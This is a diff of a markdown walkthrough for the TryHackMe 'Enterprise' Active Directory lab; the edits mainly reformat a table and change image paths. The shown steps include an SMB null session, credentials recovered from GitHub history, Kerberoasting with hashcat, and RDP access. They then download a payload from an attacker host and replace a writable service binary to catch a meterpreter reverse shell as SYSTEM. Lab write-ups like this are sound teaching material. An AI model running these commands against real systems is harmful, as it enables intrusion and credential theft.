@@ -1,17 +1,17 @@
 # NULLSECURE - FROM NULL TO ROOT
 
-🎥 Video Walkthrough: [VIDEO LINK](https://youtu.be/-N5jcbFljgQ)
+🎥 Video Walkthrough: [VIDEO LINK]
 
 # Enterprise — TryHackMe Full Walkthrough
 
-|                 |                                                                                                                                                             |
-| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Room**        | [Enterprise](https://tryhackme.com/room/enterprise)                                                                                                         |
-| **Difficulty**  | Hard (Unguided Challenge)                                                                                                                                   |
-| **Target IP**   | 10.145.136.25                                                                                                                                               |
-| **Hostname**    | LAB-DC.LAB.ENTERPRISE.THM                                                                                                                                   |
-| **Domain**      | ENTERPRISE.THM                                                                                                                                              |
-| **OS**          | Windows Server (Build 10.0.17763)                                                                                                                           |
+| | |
+|---|---|
+| **Room** | [Enterprise](https://tryhackme.com/room/enterprise) |
+| **Difficulty** | Hard (Unguided Challenge) |
+| **Target IP** | 10.145.136.25 |
+| **Hostname** | LAB-DC.LAB.ENTERPRISE.THM |
+| **Domain** | ENTERPRISE.THM |
+| **OS** | Windows Server (Build 10.0.17763) |
 | **Attack Path** | SMB Null Session → OSINT (Bitbucket/GitHub) → Credential Leak → PowerShell History Loot → Kerberoasting → RDP Foothold → Modifiable Service Binary → SYSTEM |
 
 ---
@@ -73,7 +73,7 @@ sudo nano /etc/hosts
 # 10.145.136.25   lab-dc.lab.enterprise.thm lab.enterprise.thm enterprise.thm ent
 ```
 
-![hosts file entry for the Enterprise domain](images/image-838.png)
+![hosts file entry for the Enterprise domain](Images/image-838.png)
 
 With name resolution sorted, tried an SMB null session — always worth a shot on a DC before assuming credentials are required:
 
@@ -83,7 +83,7 @@ smbclient -L //ent/ -U ''
 
 That returned two non-default shares: **Docs** and **Users**.
 
-![null session share listing on //ent/](images/image-839.png)
+![null session share listing on //ent/](Images/image-839.png)
 
 Pulled everything down from both shares for offline review:
 
@@ -94,7 +94,7 @@ smb: \> prompt off
 smb: \> mget *
 ```
 
-![recursive download of the Docs share](images/image-840.png)
+![recursive download of the Docs share](Images/image-840.png)
 
 ```bash
 smbclient //ent/Users -U ''
@@ -115,26 +115,26 @@ Two files pulled from **Docs** stood out immediately: `RSA-Secured-Credentials.x
 libreoffice RSA-Secured-Credentials.xlsx   # prompts for password
 ```
 
-![password prompt on RSA-Secured-Credentials.xlsx](images/image-842.png)
+![password prompt on RSA-Secured-Credentials.xlsx](Images/image-842.png)
 
 ```bash
 libreoffice RSA-Secured-Document-PII.docx  # prompts for password
 ```
 
-![password prompt on RSA-Secured-Document-PII.docx](images/image-843.png)
+![password prompt on RSA-Secured-Document-PII.docx](Images/image-843.png)
 
 These were parked as a goal to revisit once credentials surfaced elsewhere.
 
 Checked the web service on port 80 next. IIS with no title and nothing obviously interesting, but out of due diligence checked `robots.txt` anyway — genuinely odd to see one on a Domain Controller's web root, since `robots.txt` exists for search-engine crawlers, not attackers. It turned out to be a dead end, no disallowed paths worth chasing.
 
-![robots.txt on port 80](images/image-844.png)
-![robots.txt contents — nothing of value](images/image-845.png)
+![robots.txt on port 80](Images/image-844.png)
+![robots.txt contents — nothing of value](Images/image-845.png)
 
 The real lead was port **7990**. Browsing to it revealed an Atlassian-branded login page with an internal notice baked into it:
 
 > *Reminder to all Enterprise-THM Employees: We are moving to Github! Log in to your account*
 
-![Atlassian login page with GitHub migration notice](images/image-846.png)
+![Atlassian login page with GitHub migration notice](Images/image-846.png)
 
 That's a direct pointer outside the AD boundary. Followed it to the organization's public GitHub:
 
@@ -142,20 +142,20 @@ That's a direct pointer outside the AD boundary. Followed it to the organization
 https://github.com/Enterprise-THM
 ```
 
-![Enterprise-THM GitHub organization](images/image-847.png)
+![Enterprise-THM GitHub organization](Images/image-847.png)
 
 Worked through the organization's public surface systematically — About Us page, README, then the People tab:
 
-![About-Us page](images/image-848.png)
-![README review](images/image-849.png)
+![About-Us page](Images/image-848.png)
+![README review](Images/image-849.png)
 
 Only **one member** was listed under People, so that account became the next stop:
 
-![single member found under the org's People tab](images/image-850.png)
+![single member found under the org's People tab](Images/image-850.png)
 
 That member had a public repository containing a `SystemInfo.ps1` script. The current version was clean, but checking the **commit history** for changes to the file ("check update in code") revealed an earlier commit where credentials had been hardcoded and later removed — a classic case of a secret leaked into Git history and never actually invalidated:
 
-![commit history diff exposing hardcoded credentials in SystemInfo.ps1](images/image-851.png)
+![commit history diff exposing hardcoded credentials in SystemInfo.ps1](Images/image-851.png)
 
 That diff handed over valid domain credentials:
 
@@ -163,7 +163,7 @@ That diff handed over valid domain credentials:
 nik : ToastyBoi!
 ```
 
-![credentials recovered from Git history](images/image-853.png)
+![credentials recovered from Git history](Images/image-853.png)
 
 **The vulnerability:** a working domain credential pair was leaked through Git commit history on a public repository tied to the organization's real infrastructure — a supply-chain/OSINT weakness that has nothing to do with a technical bug on the DC itself, and everything to do with process.
 
@@ -201,7 +201,7 @@ nxc smb ent -u 'replication' -p '101RepAdmin123!!'
 
 No luck — authentication failed.
 
-![replication credentials failing against SMB](images/image-854.png)
+![replication credentials failing against SMB](Images/image-854.png)
 
 Fell back to the credentials pulled from GitHub instead:
 
@@ -211,7 +211,7 @@ nxc smb ent -u 'nik' -p 'ToastyBoi!'
 
 That authenticated cleanly.
 
-![nik credentials authenticating successfully via SMB](images/image-855.png)
+![nik credentials authenticating successfully via SMB](Images/image-855.png)
 
 With a valid domain account, enumerated the user base:
 
@@ -219,7 +219,7 @@ With a valid domain account, enumerated the user base:
 nxc smb ent -u 'nik' -p 'ToastyBoi!' --users
 ```
 
-![domain user enumeration via nxc](images/image-856.png)
+![domain user enumeration via nxc](Images/image-856.png)
 
 One of the accounts stood out as a likely service account: **bitbucket** — a natural fit given the Atlassian service seen on port 7990. Kerberoasted it directly using nik's authenticated context:
 
@@ -227,7 +227,7 @@ One of the accounts stood out as a likely service account: **bitbucket** — a n
 impacket-GetUserSPNs 'lab.enterprise.thm/nik:ToastyBoi!' -dc-ip lab-dc.lab.enterprise.thm -request-user bitbucket -outputfile spns.txt
 ```
 
-![TGS ticket requested for the bitbucket SPN](images/image-857.png)
+![TGS ticket requested for the bitbucket SPN](Images/image-857.png)
 
 Cracked the recovered TGS-REP hash offline with Hashcat against rockyou.txt:
 
@@ -239,7 +239,7 @@ hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
 bitbucket:littleredbucket
 ```
 
-![Hashcat cracking the bitbucket service account hash](images/image-858.png)
+![Hashcat cracking the bitbucket service account hash](Images/image-858.png)
 
 Validated the cracked credentials — they worked over both SMB and RDP, with NetExec flagging RDP as **Pwn3d!**, meaning the account has interactive admin-level access:
 
@@ -248,7 +248,7 @@ nxc smb ent -u 'bitbucket' -p 'littleredbucket'
 nxc rdp ent -u 'bitbucket' -p 'littleredbucket'
 ```
 
-![bitbucket credentials confirmed with Pwn3d! over RDP](images/image-859.png)
+![bitbucket credentials confirmed with Pwn3d! over RDP](Images/image-859.png)
 
 Connected in over RDP for a full interactive foothold:
 
@@ -256,11 +256,11 @@ Connected in over RDP for a full interactive foothold:
 xfreerdp /compression /cert:ignore +auto-reconnect /v:ent /u:'bitbucket' /p:'littleredbucket' +clipboard
 ```
 
-![interactive RDP session as bitbucket](images/image-860.png)
+![interactive RDP session as bitbucket](Images/image-860.png)
 
 User flag retrieved from the Desktop:
 
-![user flag on the Desktop](images/image-861.png)
+![user flag on the Desktop](Images/image-861.png)
 
 **User Flag:** `THM{ed882d02b34246536ef7da79062bef36}`
 
@@ -278,7 +278,7 @@ python3 -m http.server 8000
 Invoke-WebRequest -Uri http://192.168.129.1:8000/PowerUp.ps1 -OutFile PowerUp.ps1
 ```
 
-![PowerUp.ps1 transferred to the target](images/image-862.png)
+![PowerUp.ps1 transferred to the target](Images/image-862.png)
 
 Loaded it and ran a full privilege escalation audit:
 
@@ -288,7 +288,7 @@ Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 ```
 
-![Invoke-AllChecks running against the target](images/image-863.png)
+![Invoke-AllChecks running against the target](Images/image-863.png)
 
 The audit flagged a modifiable Windows service:
 
@@ -302,7 +302,7 @@ CanRestart     : True
 Check          : Modifiable Service Files
 ```
 
-![PowerUp flagging zerotieroneservice as a modifiable service file](images/image-864.png)
+![PowerUp flagging zerotieroneservice as a modifiable service file](Images/image-864.png)
 
 **The privilege escalation path:** `zerotieroneservice` runs as `LocalSystem`, and its binary is writable by any authenticated user (`BUILTIN\Users`). Any file dropped in that path will be executed with SYSTEM privileges the next time the service starts — a textbook weak service-binary-permissions escalation.
 
@@ -324,7 +324,7 @@ cd 'C:\Program Files (x86)\Zero Tier'
 Invoke-WebRequest -Uri http://192.168.129.1:8000/shell2.exe -OutFile Zero.exe
 ```
 
-![payload staged inside the writable ZeroTier service directory](images/image-865.png)
+![payload staged inside the writable ZeroTier service directory](Images/image-865.png)
 
 Stood up a matching listener in Metasploit:
 
@@ -337,7 +337,7 @@ msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 msf exploit(multi/handler) > exploit
 ```
 
-![Metasploit multi/handler listening for the callback](images/image-866.png)
+![Metasploit multi/handler listening for the callback](Images/image-866.png)
 
 Restarted the service to trigger execution of the malicious binary as SYSTEM, then migrated into `lsass.exe` to stabilize the session:
 
@@ -349,7 +349,7 @@ Start-Service -Name zerotieroneservice
 migrate -N lsass.exe
 ```
 
-![SYSTEM shell caught, migrated into lsass.exe](images/image-867.png)
+![SYSTEM shell caught, migrated into lsass.exe](Images/image-867.png)
 
 Root flag retrieved from the Administrator's Desktop:
 
@@ -357,7 +357,7 @@ Root flag retrieved from the Administrator's Desktop:
 meterpreter > cat C:\Users\Administrator\Desktop\root.txt
 ```
 
-![root flag read from the Administrator's Desktop](images/image-868.png)
+![root flag read from the Administrator's Desktop](Images/image-868.png)
 
 **Root Flag:** `THM{1a1fa94875421296331f145971ca4881}`
 
